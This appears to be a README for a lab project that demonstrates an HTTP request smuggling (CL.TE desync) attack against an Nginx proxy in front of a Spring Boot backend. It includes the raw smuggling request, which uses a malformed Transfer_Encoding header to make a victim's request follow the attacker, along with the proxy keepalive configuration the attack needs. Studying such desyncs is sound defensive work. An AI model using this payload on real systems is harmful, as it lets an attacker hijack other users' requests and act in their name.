# Http Smuggling Demo Project (Nginx + Spring)
### This project is intend to
- To study the behaviours of Http Smuggling Attack on a FE + BE application combination.
- To understand what are the pre-conditions of a system setup that potentially exploit-able

### Project Structure
#### http-smuggler-application
- acts as Back End Service. typical spring boot application
- simple rest API to simulate the scenario of
    - login
    - users/me
    - users?follow=${name}
#### nginx
- acts as Front End Service (LB|Proxy|ReversedProxy)
- uses nginx lua module to perform `http headers normalization` that converts invalid headers that consist of `_` to `-`
- It is almost impossible to perform `http headers normalization` on sensitive/builtin headers with nginx lua module, hacks have been done in order to achieve it
#### http-smuggler-gateway
- tries to reproduce using a Spring Gateway + Spring Boot approach
- It is almost impossible to realise where
    - Spring Gateway will throw error where filter headers have both CL and TE [link](https://github.com/spring-cloud/spring-cloud-gateway/blob/59cba504509ee807ab5c6be01ba46c20b034cd8f/spring-cloud-gateway-server/src/main/java/org/springframework/cloud/gateway/filter/NettyRoutingFilter.java#L168-L175).
    - Requires a keep alive socket connection between the two (yet to be POCed)

### Demo Flow
To simulate user impersonate attack using Http Smuggling Attack. Execute the request payload in the burp suite application (repeater)

- Two demo users, `bob | pwd` and `alice | pwd`
- `alice` login to the application, and be return with a sessionId
```
POST /v1/login HTTP/1.1
Accept: */*
Cache-Control: no-cache
Host: localhost
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 27

username=alice&password=pwd
```

- Uses the sessionId, alice retrieves her information using `v1/users/me` api
```
GET /v1/users/me HTTP/1.1
Authorization: ${sessionId}
Accept: */*
Cache-Control: no-cache
Host: localhost
Accept-Encoding: gzip, deflate
```

- bob performs CLTE Http Smuggling Attack from the login API
```
POST /v1/login HTTP/1.1
Content-Type: application/json
Accept: */*
Cache-Control: no-cache
Host: localhost
Connection: keep-alive
Content-Length: 89
Transfer_Encoding: chunked

23
{"username":"bob","password":"pwd"}
0

PUT /v1/users/follow?user=bob HTTP/1.1
X:X
```
- On the next `users/me` query, alice's request will be smuggled and resulting in following bob `PUT /v1/users/follow?user=bob`, result can be observed from the response payload.

### Explanation
- The invalid header `Transfer_Encoding` will be normalised at the proxy layer to a valid `Transfer-Encoding` header when it passes to application layer
- As `Transfer-Encoding` has higher precedence than `Content-Length`, a desync is happened where FE uses `Content-Length` but BE uses `Transfer-Encoding`
- As the `Transfer-Encoding`'s payload is much shorter, the application layer will think the payload ends at the 0, and will threat the follow `PUT /v1 ***` request as the next request
- when the victim request comes in (alice), the application will process the request as the below, and results in performing `/v1/users/follow?user=bob` instead of `/v1/users/me`
```
PUT /v1/users/follow?user=bob HTTP/1.1
X:XGET /v1/users/me HTTP/1.1 // silence the request URL part
Authorization: ${sessionId}
Accept: */*
Cache-Control: no-cache
Host: localhost
Accept-Encoding: gzip, deflate
```

### Experiment Findings
Two conditions to meet for a success Http smuggling
- Make use of the variant of CL & TE headers to trick payload mismatch between FE and BE
- The connection between FE & BE must be `Http 1.1 with pipelining enabled`  where multiple HTTP requests are sent on a single TCP connection
- To configure Nginx to perform `http pipelining`
```
upstream application {
  server localhost:9090;
  keepalive 16;
}

proxy_set_header Connection "";
proxy_http_version 1.1;

```

### Additional Dev Notes
#### Setup Burp Suite on Firefox
- Burp Suite is suitable to send HTTP request with Transfer-Encoding = chunked
- by default, localhost | 127.0.0.1 won't forward traffic to proxy server
- to enable it, go  to tab `about:config` then look for `network.proxy.allow_hijacking_localhost`. [(reference)](https://security.stackexchange.com/a/211555/224446)
